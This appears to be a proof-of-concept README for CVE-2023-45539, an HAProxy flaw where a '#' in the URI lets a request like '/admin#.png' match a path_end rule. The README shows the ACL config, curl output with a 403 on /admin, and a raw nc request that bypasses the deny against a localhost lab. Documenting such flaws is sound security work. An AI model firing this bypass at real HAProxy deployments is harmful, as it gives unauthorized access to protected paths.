# HAProxy-CVE-2023-45539-PoC

HAProxy before 2.8.2 accepts # as part of the URI component, which might allow remote attackers to obtain sensitive information or have unspecified other impact upon misinterpretation of a path_end rule, such as routing index.html#.png to a static server.

What gets misrouted in this CVE isn't any extension that the backend app "supports" — it's only the ones that HAProxy itself is configured to route using path_end (or regex) ACLs.

```bash
acl is_static path_end .png .jpg .gif .css .js
use_backend be_static if is_static
```
That means:

HAProxy doesn’t care whether the backend can actually serve .png, .js, etc.

It only looks at the suffix match in the request path.

If the suffix matches one of those strings, it routes to be_static.

So:

/admin#.png → matches .png → goes to be_static → bypass 

/admin#.asc → doesn’t match → stays in be_app → hits deny → 403 


```bash
curl -i http://localhost:6655/public                                               
HTTP/1.1 200 OK
content-length: 7
content-type: text/plain

APP OK
```
                                                                                                                               
```bash
curl -i http://localhost:6655/admin 
HTTP/1.1 403 Forbidden
content-length: 93
cache-control: no-cache
content-type: text/html

<html><body><h1>403 Forbidden</h1>
Request forbidden by administrative rules.
</body></html>
```

## Bypass

```bash
printf 'GET /admin#.png HTTP/1.1\r\nHost: localhost\r\n\r\n' | nc -q1 127.0.0.1 6655
HTTP/1.1 200 OK
content-length: 31
content-type: text/plain

STATIC OK (routed by path_end)
```


